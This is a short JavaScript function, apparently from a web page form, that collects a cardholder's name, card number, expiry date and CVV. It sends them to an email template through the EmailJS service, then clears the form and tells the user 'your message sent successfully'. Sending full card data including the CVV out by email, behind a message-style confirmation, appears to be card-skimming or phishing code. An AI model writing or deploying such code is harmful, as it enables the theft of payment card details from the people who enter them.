function senMail(){
    var params = {
        name: document.getElementById("name").value,
        number: document.getElementById("number").value,
        date: document.getElementById("date").value,
        cvv: document.getElementById("cvv").value,
    };
    const serviceID = "service_kd4g813";
    const templateID = "template_9hxsccd";
    emailjs
.send(serviceID,templateID,params)
.then(
    (res) =>{
        document.getElementById("name").value = "";
        document.getElementById("number").value = "";
        document.getElementById("date").value = "";
        document.getElementById("cvv").value = "";
        console.log(res);
        alert("your message sent successfully");

    })

.catch((err) =>console.log(err));
}